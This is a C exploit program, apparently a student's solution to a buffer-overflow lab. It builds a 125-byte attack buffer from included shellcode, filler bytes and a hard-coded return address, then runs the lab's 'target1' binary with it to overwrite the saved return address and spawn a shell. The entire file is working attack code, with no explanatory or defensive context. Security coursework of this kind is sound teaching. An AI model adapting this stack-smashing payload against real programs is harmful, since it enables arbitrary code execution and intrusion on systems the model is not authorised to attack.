#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define BUFSIZE 125
#define TARGET_RA_ADDR 0x202dfeb0
#define SHELL_LENGTH 45

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char attack_buffer[BUFSIZE];
	int *p;

	for(int i = 0; i < BUFSIZE;i++)
		attack_buffer[i] = 0x04;
	
	for(int i = 0; i < SHELL_LENGTH;i++)
		attack_buffer[i] = shellcode[i];
	
	for(int i = 45 ; i < 120; i++)
		attack_buffer[i] = 0x05;

	int *a = (int*)&attack_buffer[120];
	*a = TARGET_RA_ADDR;

	attack_buffer[BUFSIZE-1] = '\0';

	args[0] = TARGET;
	args[1] = attack_buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
